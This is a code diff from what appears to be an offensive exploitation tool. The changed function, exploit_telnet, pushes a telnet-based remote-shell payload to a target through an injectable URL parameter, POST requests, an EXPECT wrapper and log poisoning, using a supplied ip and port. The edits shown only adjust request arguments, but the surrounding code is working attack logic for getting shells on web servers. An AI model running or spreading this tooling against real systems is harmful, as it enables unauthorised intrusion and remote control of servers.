@@ -1,7 +1,7 @@
+"""Telnet payload"""
 from src.httpreqs import request
 from src.configs import config
 from src.utils.encodings import encode
-from src.utils.args_check import headers
 from src.utils.arguments import args
 from src.attacks.logPoison import exploit_log_poison
 from src.utils.info import printInfo
@@ -46,6 +46,7 @@ def exploit_telnet(exploit, method, ip, port):
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(telnetTest)),
                 args.httpheaders,
+                "",
                 config.proxies,
                 "",
                 "",
@@ -63,7 +64,7 @@ def exploit_telnet(exploit, method, ip, port):
                     "",
                 )
             else:
-                request.REQUEST(u, args.httpheaders, config.proxies, "", "")
+                request.REQUEST(u, args.httpheaders, "", config.proxies, "", "")
             return True
     if method == "EXPECT":
         if args.postreq:
@@ -79,6 +80,7 @@ def exploit_telnet(exploit, method, ip, port):
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(telnetTest)),
                 args.httpheaders,
+                "",
                 config.proxies,
                 "",
                 "",
@@ -96,7 +98,7 @@ def exploit_telnet(exploit, method, ip, port):
                     "",
                 )
             else:
-                request.REQUEST(u, args.httpheaders, config.proxies, "", "")
+                request.REQUEST(u, args.httpheaders, "", config.proxies, "", "")
             return True
     if method == "TRUNC":
         exploit_log_poison(
@@ -125,6 +127,7 @@ def exploit_telnet(exploit, method, ip, port):
             res, _ = request.REQUEST(
                 url.replace(config.tempArg, encode(telnetTest)),
                 args.httpheaders,
+                "",
                 config.proxies,
                 "",
                 "",
@@ -144,6 +147,7 @@ def exploit_telnet(exploit, method, ip, port):
                 request.REQUEST(
                     url.replace(config.tempArg, encode(telnetPayload)),
                     args.httpheaders,
+                    "",
                     config.proxies,
                     "",
                     "",
